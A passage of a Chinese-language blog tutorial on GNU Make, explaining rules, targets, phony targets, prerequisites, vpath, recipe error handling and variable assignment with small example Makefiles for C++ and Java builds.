开头必须为一个Tab，不能为空格</span><br></code></pre></td></tr></table></figure><p><strong>但通常需要将编译与链接分开写，分为如下两步</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">hello: hello.o</span><br>    g++ hello.o -o hello<br><span class="hljs-section">hello.o: hello.cpp</span><br>    g++ -c hello.cpp<br></code></pre></td></tr></table></figure><p>&nbsp;</p><p><strong>规则</strong>(Rules)：一个Makefile文件由一条一条的规则构成，一条规则结构如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">target … (目标): prerequisites …(依赖)<br>        recipe(方法)<br>        …<br>        …<br></code></pre></td></tr></table></figure><p>第二种写法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">target … (目标): prerequisites …(依赖); recipe(方法) ;…<br></code></pre></td></tr></table></figure><p>&nbsp;<br>&nbsp;<br>Make主要用于处理C和C++的编译工作，但不只能处理C和C++，所有编译器&#x2F;解释器能在命令行终端运行的编程语言都可以处理(例如Java、Python、 Golang….)。Make也不只能用来处理编程语言，所有基于一些文件(依赖)的改变去更新另一些文件(目标)的工作都可以做。</p><p><strong>Make编译与打包Java程序示例</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">snake.jar : C.class Main.class SnakeFrame.class SnakePanel.class<br>    jar -cvfe snake.jar Main *.class<br><br>C.class : C.java<br>    javac C.java<br><br>Main.class : Main.java<br>    javac Main.java<br><br>SnakeFrame.class : SnakeFrame.java<br>    javac SnakeFrame.java<br><br>SnakePanel.class : SnakePanel.java<br>    javac SnakePanel.java<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean:</span><br>    rm *.class *.jar<br></code></pre></td></tr></table></figure><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="Makefile文件的命名与指定"><a href="#Makefile文件的命名与指定" class="headerlink" title="Makefile文件的命名与指定"></a>Makefile文件的命名与指定</h2><p>Make会自动查找makefile文件，查找顺序为GNUmakefile -&gt; makefile -&gt; Makefile</p><p><strong>GNUmakefile</strong>：不建议使用，因为只有GNU make会识别，其他版本的make（如BSD make, Windows nmake等）不会识别，如果只给GNU make使用的情况</p><p><strong>makefile</strong>：可以使用，GNU make和其他版本make识别</p><p><strong>Makefile</strong>：最常用，强烈建议使用</p><p>如果运行make的时候没有找到以上名字的文件，则会报错，这时候可以手动指定文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -f mkfile  # make -f &lt;filename&gt;<br>make --file=mkfile # make --file=&lt;filename&gt;<br></code></pre></td></tr></table></figure><blockquote><p>手动指定之后，make就会使用指定的文件，即使有Makefile或者makefile不会再自动使用</p></blockquote><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="Makefile文件内容组成"><a href="#Makefile文件内容组成" class="headerlink" title="Makefile文件内容组成"></a>Makefile文件内容组成</h2><p>一个Makefile文件通常由五种类型的内容组成：显式规则、隐式规则、变量定义、指令和注释</p><p><strong>显式规则</strong>(<em>explicit rules</em>)：显式指明何时以及如何生成或更新目标文件，显式规则包括目标、依赖和更新方法三个部分</p><p><strong>隐式规则</strong>(<em>implicit rules</em>)：根据文件自动推导如何从依赖生成或更新目标文件。</p><p><strong>变量定义</strong>(<em>variable definitions</em>)：定议变量并指定值，值都是字符串，类似C语言中的宏定义(#define)，在使用时将值展开到引用位置</p><p><strong>指令</strong>(<em>directives</em>)：在make读取Makefile的过程中做一些特别的操作，包括：</p><ol><li><p>读取(包含)另一个makefile文件(类似C语言中的#include)</p></li><li><p>确定是否使用或略过makefile文件中的一部分内容(类似C语言中的#if)</p></li><li><p>定义多行变量</p></li></ol><p><strong>注释</strong>(<em>comments</em>)：一行当中 # 后面的内容都是注释，不会被make执行。make当中只有单行注释。如果需要用到#而不是注释，用\#。</p><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="一个稍微复杂的Makefile"><a href="#一个稍微复杂的Makefile" class="headerlink" title="一个稍微复杂的Makefile"></a>一个稍微复杂的Makefile</h2><p><img src="/./img/1.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">sudoku: block.o command.o input.o main.o scene.o test.o</span><br>    g++ -o sudoku block.o command.o input.o main.o scene.o test.o<br><br><span class="hljs-section">block.o: block.cpp common.h block.h color.h</span><br>    g++ -c block.cpp<br><br><span class="hljs-section">command.o: command.cpp scene.h common.h block.h command.h</span><br>    g++ -c command.cpp<br><br><span class="hljs-section">input.o: input.cpp common.h utility.inl</span><br>    g++ -c input.cpp<br><br><span class="hljs-section">main.o: main.cpp scene.h common.h block.h command.h input.h</span><br>    g++ -c main.cpp<br><br><span class="hljs-section">scene.o: scene.cpp common.h scene.h block.h command.h utility.inl</span><br>    g++ -c scene.cpp<br><br><span class="hljs-section">test.o: test.cpp test.h scene.h common.h block.h command.h</span><br>    g++ -c test.cpp<br><br><span class="hljs-section">hello.o: hello.cpp</span><br>    g++ -c hello.cpp<br><br><br><span class="hljs-section">clean:</span><br>    rm block.o command.o input.o main.o scene.o test.o<br>    rm sudoku.exe<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">target … (目标): prerequisites …(依赖)<br>        recipe(方法)<br>        …<br>        …<br></code></pre></td></tr></table></figure><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol><li><p>Makefile中会有很多目标，但最终目标只有一个，其他所有内容都是为这个最终目标服务的，写Makefile的时候<strong>先写出最终目标，再依次解决总目标的依赖</strong></p></li><li><p>一般情况第一条规则中的目标会被确立为最终目标，第一条规则默认会被make执行</p></li><li><p>通常来说目标是一个文件，一条规则的目的就是生成或更新目标文件。</p></li><li><p>make会根据目标文件和依赖文件最后修改时间判断是否需要执行更新目标文件的方法。如果目标文件不存在或者目标文件最后修改时间早于其中一个依赖文件最后修改时间，则重新执行更新目标文件的方法。否则不会执行。</p></li><li><p>除了最终目标对应的更新方法默认会执行外，如果Makefile中一个目标不是其他目标的依赖，那么这个目标对应的规则不会自动执行。需要手动指定，方法为</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">make &lt;target&gt;  <span class="hljs-comment"># 如 make clean , make hello.o</span><br></code></pre></td></tr></table></figure></li><li><p>可以使用.DEFAULT_GOAL来修改默认最终目标</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile">.DEFAULT_GOAL = main<br><br><span class="hljs-section">all: </span><br>    @echo all<br><br><span class="hljs-section">main:</span><br>    @echo main<br></code></pre></td></tr></table></figure></li></ol><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h2><p>如果一个标并不是一个文件，则这个目标就是伪目标。例如前面的clean目标。如果说在当前目录下有一个文件名称和这个目标名称冲突了，则这个目标就没法执行。这时候需要用到一个特殊的目标 .PHONY，将上面的clean目标改写如下 </p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean:</span><br>    rm block.o command.o input.o main.o scene.o test.o<br>    rm sudoku.exe<br></code></pre></td></tr></table></figure><p>这样即使当前目录下存在与目标同名的文件，该目标也能正常执行。</p><p><strong>伪目标的其他应用方式</strong></p><p>如果一条规则的依赖文件没有改动，则不会执行对应的更新方法。如果需要每次不论有没有改动都执行某一目标的更新方法，可以把对应的目标添加到.PHONY的依赖中，例如下面这种方式，则每次执行make都会更新test.o，不管其依赖文件有没有改动</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test.o: test.cpp test.h</span><br>        g++ -c test.cpp<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean test.o</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><h3 id="依赖类型"><a href="#依赖类型" class="headerlink" title="依赖类型"></a>依赖类型</h3><p><strong>普通依赖</strong></p><p>前面说过的这种形式都是普通依赖。直接列在目标后面。普通依赖有两个特点：</p><ol><li>如果这一依赖是由其他规则生成的文件，那么执行到这一目标前会先执行生成依赖的那一规则 </li><li>如果任何一个依赖文件修改时间比目标晚，那么就重新生成目标文件</li></ol><p><strong>order-only依赖</strong></p><p>依赖文件不存在时，会执行对应的方法生成，但依赖文件更新并不会导致目标文件的更新</p><p>如果目标文件已存在，order-only依赖中的文件即使修改时间比目标文件晚，目标文件也不会更新。</p><p>定义方法如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">targets : normal-prerequisites | order-only-prerequisites<br></code></pre></td></tr></table></figure><p>normal-prerequisites部分可以为空</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="指定依赖搜索路径"><a href="#指定依赖搜索路径" class="headerlink" title="指定依赖搜索路径"></a>指定依赖搜索路径</h3><p>make默认在Makefile文件所在的目录下查找依赖文件，如果找不到，就会报错。这时候就需要手动指定搜索路径，用VPATH变量或vpath指令。</p><p><strong>VPATH用法如下：</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">VPATH = &lt;dir1&gt;:&lt;dir2&gt;:&lt;dir3&gt;...<br><span class="hljs-comment"># 例如</span><br>VPATH = <span class="hljs-keyword">include</span>:src<br></code></pre></td></tr></table></figure><p>多个目录之间冒号隔开，这时make会在VPATH指定的这些目录里面查找依赖文件。</p><p><strong>vpath指令用法：</strong></p><p>vpath比VPATH使用更灵活，可以指定某个类型的文件在哪个目录搜索。</p><p>用法如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">vpath</span> &lt;pattern&gt; &lt;directories&gt;<br><br><span class="hljs-keyword">vpath</span> %.h <span class="hljs-keyword">include</span>  <span class="hljs-comment"># .h文件在include目录下查找</span><br><span class="hljs-keyword">vpath</span> %.h <span class="hljs-keyword">include</span>:headers  <span class="hljs-comment"># .h文件在include或headers文件下查找</span><br><br><span class="hljs-keyword">vpath</span> % src   <span class="hljs-comment"># 所有文件都在src下查找</span><br><br><span class="hljs-keyword">vpath</span> hello.cpp src  <span class="hljs-comment"># hello.cpp文件在src查找</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="更新方法"><a href="#更新方法" class="headerlink" title="更新方法"></a>更新方法</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">target … (目标): prerequisites …(依赖)<br>        recipe(方法)<br>        …<br>        …<br></code></pre></td></tr></table></figure><h4 id="关于执行终端"><a href="#关于执行终端" class="headerlink" title="关于执行终端"></a>关于执行终端</h4><p>更新方法实际上是一些Shell指令，通常以Tab开头，或直接放在目标-依赖列表后面，用分号隔开。这些指令都需要交给Shell执行，所以需要符合Shell语法。默认使用的Shell是sh，在Windows上如果没有安装sh.exe的话会自动查找使用cmd.exe之类的终端。这时有的指令写法，例如循环语句，与Linux不同，需要注意。</p><p>可以通过SHELL变量手动指定Shell</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">SHELL = C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe<br>SHELL = cmd.exe<br></code></pre></td></tr></table></figure><p>默认的执行方式为一条指令重新调用一个Shell进程来执行。有时为了提高性能或其他原因，想让这个目标的所有指令都在同一进程中执行，可以在Makefile中添加 .ONESHELL</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">.ONESHELL:</span><br></code></pre></td></tr></table></figure><p>这样所有指令都会在同一次Shell调用中执行</p><h4 id="Shell语句回显问题"><a href="#Shell语句回显问题" class="headerlink" title="Shell语句回显问题"></a>Shell语句回显问题</h4><p>通常make在执行一条Shell语句前都会先打印这条语句，如果不想打印可以在语句开头在@</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">@echo hello<br>@g++ -o hello hello.cpp<br></code></pre></td></tr></table></figure><p>也可以使用.SILENT来指定哪些目标的更新方法指令不用打印</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">.SILENT: main all</span><br></code></pre></td></tr></table></figure><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><p>如果一条规则当中包含多条Shell指令，每条指令执行完之后make都会检查返回状态，如果返回状态是0，则执行成功，继续执行下一条指令，直到最后一条指令执行完成之后，一条规则也就结束了。</p><p>如果过程中发生了错误，即某一条指令的返回值不是0，那么make就会终止执行当前规则中剩下的Shell指令。</p><p>例如</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>    rm main.o hello.o<br>    rm main.exe<br></code></pre></td></tr></table></figure><p>这时如果第一条rm main.o hello.o出错，第二条rm main.exe就不会执行。类似情况下，希望make忽视错误继续下一条指令。在指令开头<code>-</code>可以达到这种效果。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>    -rm main.o hello.o<br>    -rm main.exe<br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="变量应用"><a href="#变量应用" class="headerlink" title="变量应用"></a>变量应用</h2><p>Makefile中的变量有点类似C语言中的宏定义，即用一个名称表示一串文本。但与C语言宏定义不同的是，Makefile的变量值是可以改变的。变量定义之后可以在目标、依赖、方法等Makefile文件的任意地方进行引用。</p><blockquote><p>Makefile中的变量值只有一种类型： 字符串</p></blockquote><p><strong>变量可以用来表示什么</strong></p><ul><li><p>文件名序列</p></li><li><p>编译选项</p></li><li><p>需要运行的程序</p></li><li><p>需要进行操作的路径</p></li><li><p>……</p></li></ul><h3 id="变量定义与引用方式"><a href="#变量定义与引用方式" class="headerlink" title="变量定义与引用方式"></a>变量定义与引用方式</h3><p><strong>定义方式</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># &lt;变量名&gt; = &lt;变量值&gt;  &lt;变量名&gt; := &lt;变量值&gt;  &lt;变量名&gt; ::= &lt;变量值&gt;</span><br>files = main.cpp hello.cpp<br>objects := main.o hello.o<br>var3 ::= main.o<br></code></pre></td></tr></table></figure><blockquote><p>变量名区分大小写，可以是任意字符串，不能含有”:”, “#”, “&#x3D;”</p></blockquote><p><strong>使用方式</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># $(&lt;变量名&gt;) 或者 $&#123;&lt;变量名&gt;&#125;</span><br>main.o : <span class="hljs-variable">$(files)</span> <span class="hljs-comment"># 或者 $&#123;files&#125;</span><br>    ...<br></code></pre></td></tr></table></figure><blockquote><p>如果变量名只有一个字符，使用时可以不用括号，如$a, $b， 但不建议这样用，不管是否只有一个字符都写成$(a), $(b)这种形式</p></blockquote><h3 id="Makefile读取过程"><a href="#Makefile读取过程" class="headerlink" title="Makefile读取过程"></a>Makefile读取过程</h3><p>GNU make分两个阶段来执行Makefile，第一阶段(读取阶段)：</p><ul><li><p>读取Makefile文件的所有内容</p></li><li><p>根据Makefile的内容在程序内建立起变量</p></li><li><p>在程序内构建起显式规则、隐式规则</p></li><li><p>建立目标和依赖之间的依赖图</p></li></ul><p>第二阶段(目标更新阶段)：</p><ul><li>用第一阶段构建起来的数据确定哪个目标需要更新然后执行对应的更新方法</li></ul><p>变量和函数的展开如果发生在第一阶段，就称作<strong>立即展开</strong>，否则称为<strong>延迟展开</strong>。立即展开的变量或函数在第一个阶段，也就是Makefile被读取解析的时候就进行展开。延迟展开的变量或函数将会到用到的时候才会进行展开，有以下两种情况：</p><ul><li><p>在一个立即展开的表达式中用到</p></li><li><p>在第二个阶段中用到</p></li></ul><p><strong>显式规则中，目标和依赖部分都是立即展开，在更新方法中延迟展开</strong></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><h4 id="递归展开赋值（延迟展开）"><a href="#递归展开赋值（延迟展开）" class="headerlink" title="递归展开赋值（延迟展开）"></a>递归展开赋值（延迟展开）</h4><p>第一种方式就是直接使用<kbd>=</kbd>，这种方式如果赋值的时候右边是其他变量引用或者函数调用之类的，将不会做处理，直接保留原样，在使用到该变量的时候再来进行处理得到变量值（Makefile执行的第二个阶段再进行变量展开得到变量值）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">bar2 = ThisIsBar2No.1<br>foo = <span class="hljs-variable">$(bar)</span><br>foo2 = <span class="hljs-variable">$(bar2)</span><br><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(foo)</span>  <span class="hljs-comment"># Huh?</span><br>    @echo <span class="hljs-variable">$(foo2)</span>  <span class="hljs-comment"># ThisIsBar2No.2</span><br>    @echo <span class="hljs-variable">$(ugh)</span>   <span class="hljs-comment"># Huh?</span><br><br>bar = <span class="hljs-variable">$(ugh)</span><br>ugh = Huh?<br>bar2 = ThisIsBar2No.2<br></code></pre></td></tr></table></figure><h4 id="简单赋值-立即展开"><a href="#简单赋值-立即展开" class="headerlink" title="简单赋值(立即展开)"></a>简单赋值(立即展开)</h4><p>简单赋值使用<kbd>:=</kbd>或<kbd>::=</kbd>，这种方式如果等号右边是其他变量或者引用的话，将会在赋值的时候就进行处理得到变量值。（Makefile执行第一阶段进行变量展开）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">bar2 := ThisIsBar2No.1<br>foo := <span class="hljs-variable">$(bar)</span><br>foo2 := <span class="hljs-variable">$(bar2)</span><br><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(foo)</span>    <span class="hljs-comment"># 空串，没有内容</span><br>    @echo <span class="hljs-variable">$(foo2)</span>    <span class="hljs-comment"># ThisIsBar2No.1</span><br>    @echo <span class="hljs-variable">$(ugh)</span>    <span class="hljs-comment"># </span><br><br>bar := <span class="hljs-variable">$(ugh)</span><br>ugh := Huh?<br>bar2 := ThisIsBar2No.2<br></code></pre></td></tr></table></figure><h4 id="条件赋值"><a href="#条件赋值" class="headerlink" title="条件赋值"></a>条件赋值</h4><p>条件赋值使用<kbd>?=</kbd>，如果变量已经定义过了（即已经有值了），那么就保持原来的值，如果变量还没赋值过，就把右边的值赋给变量。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">var1 = 100<br>var1 ?= 200<br><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(var1)</span> <span class="hljs-comment"># 100 注释var1 = 100之后为200</span><br></code></pre></td></tr></table></figure><p><strong>练习</strong>：试求a的值</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile">x = hello<br>y = world<br>a := <span class="hljs-variable">$(x)</span><span class="hljs-variable">$(y)</span><br><br>x = y<br>y = z<br>a := $(<span class="hljs-variable">$(x)</span>)<br><br>x = y<br>y = z<br>z = u<br>a := $($(<span class="hljs-variable">$(x)</span>))<br><br>x = <span class="hljs-variable">$(y)</span><br>y = z<br>z = Hello<br>a := $(<span class="hljs-variable">$(x)</span>)<br></code></pre></td></tr></table></figure><h4 id="追加"><a href="#追加" class="headerlink" title="追加"></a>追加</h4><p>使用<kbd>+=</kbd>在变量已有的基础上追加内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">files = main.cpp<br>files += hello.cpp<br><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(files)</span><br></code></pre></td></tr></table></figure><h4 id="Shell运行赋值"><a href="#Shell运行赋值" class="headerlink" title="Shell运行赋值"></a>Shell运行赋值</h4><p>使用<kbd>!=</kbd>，运行一个Shell指令后将返回值赋给一个变量</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">gcc_version != gcc --version<br>files != ls .<br></code></pre></td></tr></table></figure><blockquote><p>如果使用Windows需要注意，这种赋值方式只适用于与Linux相同的Shell指令，Windows独有的指令不能这样使用。</p></blockquote><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h3 id="定义多行变量"><a href="#定义多行变量" class="headerlink" title="定义多行变量"></a>定义多行变量</h3><p>前面定义的变量都是单行的。</p><p>变量值有多行，多用于定义shell指令</p><p><strong>语法</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">define</span> &lt;varable_name&gt;  <span class="hljs-comment"># 默认为 = </span><br><span class="hljs-comment"># 变量内容</span><br><span class="hljs-keyword">endef</span><br><br><span class="hljs-keyword">define</span> &lt;varable_name&gt; :=<br><span class="hljs-comment"># 变量内容</span><br><span class="hljs-keyword">endef</span><br><br><span class="hljs-keyword">define</span> &lt;varable_name&gt; +=<br><span class="hljs-comment"># 变量内容</span><br><span class="hljs-keyword">endef</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p><strong>示例</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">echosomething = @echo This is the first line<br><br><span class="hljs-keyword">define</span> echosomething +=  <br><br>@echo hello<br>@echo world<br>@echo 3<br><span class="hljs-keyword">endef</span><br><br><br><span class="hljs-section">all:</span><br>    <span class="hljs-variable">$(echosomething)</span><br></code></pre></td></tr></table></figure><h3 id="取消变量"><a href="#取消变量" class="headerlink" title="取消变量"></a>取消变量</h3><p>如果想清除一个变量，用以下方法</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">undefine</span> &lt;变量名&gt;   如 <span class="hljs-keyword">undefine</span> files,  <span class="hljs-keyword">undefine</span> objs<br></code></pre></td></tr></table></figure><h3 id="环境变量的使用"><a href="#环境变量的使用" class="headerlink" title="环境变量的使用"></a>环境变量的使用</h3><p>系统中的环境变量可以直接在Makefile中直接使用，使用方法跟普通变量一样</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(USERNAME)</span><br>    @echo <span class="hljs-variable">$(JAVA_HOME)</span><br>    @echo <span class="hljs-variable">$(SystemRoot)</span><br></code></pre></td></tr></table></figure><h3 id="变量替换引用"><a href="#变量替换引用" class="headerlink" title="变量替换引用"></a>变量替换引用</h3><p>语法：__$(var:a&#x3D;b)__，意思是将变量var的值当中每一项结尾的a替换为b，直接上例子</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">files = main.cpp hello.cpp<br>objs := $(files:.cpp=.o) <span class="hljs-comment"># main.o hello.o</span><br><span class="hljs-comment"># 另一种写法</span><br>objs := $(files:%.cpp=%.o)<br></code></pre></td></tr></table></figure><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>所有在Makefile中的变量，都可以在执行make时能过指定参数的方式进行覆盖。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">OverridDemo := ThisIsInMakefile<br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(OverridDemo)</span><br></code></pre></td></tr></table></figure><p>如果直接执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make<br></code></pre></td></tr></table></figure><p>则上面的输出内容为<em>ThisIsInMakefile</em>，但可以在执行make时指定参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">make OverridDemo=ThisIsFromOutShell # 等号两边不能有空格<br><span class="hljs-meta prompt_"># </span><span 